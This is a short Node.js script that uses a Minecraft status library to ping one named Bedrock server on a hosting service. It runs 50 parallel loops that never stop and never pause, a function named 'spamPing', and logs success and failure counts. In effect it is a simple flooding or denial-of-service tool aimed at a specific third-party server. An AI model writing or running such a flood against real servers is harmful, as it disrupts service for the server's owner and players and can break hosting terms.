import { statusBedrock } from "minecraft-server-util";

const HOST = "arenaraptora.aternos.me";
const PORT = 15039;

let total = 0;
let success = 0;
let failed = 0;

async function spamPing(threadId) {
    while (true) {
        total++;

        const start = Date.now();

        try {
            const result = await statusBedrock(HOST, PORT, {
                timeout: 2000
            });

            success++;

            console.warn(
                `[THREAD ${threadId}] ` +
                `PING ${result.roundTripLatency}ms | ` +
                `REAL ${Date.now() - start}ms | ` +
                `TOTAL ${total} | OK ${success} | FAIL ${failed}`
            );
        } catch (e) {
            failed++;

            console.warn(
                `[THREAD ${threadId}] OFFLINE/ERROR | ` +
                `TOTAL ${total} | OK ${success} | FAIL ${failed}`
            );
        }
    }
}

// количество параллельных потоков
const THREADS = 50;

for (let i = 1; i <= THREADS; i++) {
    spamPing(i);
}